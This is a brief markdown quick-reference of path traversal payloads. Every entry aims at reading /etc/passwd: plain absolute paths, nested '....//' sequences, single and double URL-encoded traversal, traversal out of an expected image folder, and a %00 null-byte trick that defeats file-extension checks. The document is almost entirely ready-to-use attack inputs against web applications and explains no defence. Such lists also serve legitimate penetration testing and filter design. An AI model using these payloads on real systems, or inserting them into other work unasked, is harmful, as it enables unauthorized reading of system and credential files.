# Path Traversal - Quick Reference

Absolute file path: 
```bash
filename=/etc/passwd
```

When escape sequenced are stripped:
```bash
# Nested Traversal Sequence
....//....//etc//passwd
```

When input is sanitised:
```bash
# Single URL Encoding
%2e%2e%2f%2e%2e%2f%2e%2e/etc/passwd

# Double URL Encoding
..%252f..%252f..%252fetc/passwd
```

When a specific folder is expected:
```bash
/var/www/images/../../../etc/passwd
```

When a specific file extension is expected:
```bash
# NULL Characater %00
../../../etc/passwd%00.png
```
